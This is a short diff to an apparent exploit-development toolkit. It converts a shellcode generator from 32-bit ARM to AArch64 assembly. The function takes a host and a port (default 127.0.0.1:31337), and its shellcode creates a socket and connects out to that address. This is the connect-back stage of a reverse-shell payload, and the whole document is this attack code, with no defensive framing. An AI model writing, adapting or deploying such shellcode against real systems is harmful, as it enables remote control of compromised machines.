@@ -17,32 +17,27 @@ def generate(host='127.0.0.1', port=31337):
     """
 
     sc = """
-    mov r0, #2
-    mov r1, #1
-    sub r2, r2, r2
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #26
+    /* socket(...) */
+    mov x0, 2
+    mov x1, 1
+    sub x2, x2, x2
+    mov x8, 198
     svc 1
-    #adr r1, sockaddr_1
-    mov r1, pc
-    add r1, #12
-    mov r2, #16
-    mov r3, #2
-    mov r6, r0
-    strh r3, [r1]
+    adr x1, sockaddr_1
+    #mov x1, pc
+    #add x1, 12
+    mov x2, 16
+    mov x6, x0
     b after_sockaddr_2
-    sub r1, r1, r1
+    sub x1, x1, x1
 
 sockaddr_1:
-    .short 0x4141
+    .short 0x0002
     .short %s
     .word  %s
     
 after_sockaddr_2:
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #28
+    mov x8, 203
     svc 1
     """ % (htons(int(port)), u32(binary_ip(host)))
     return sc
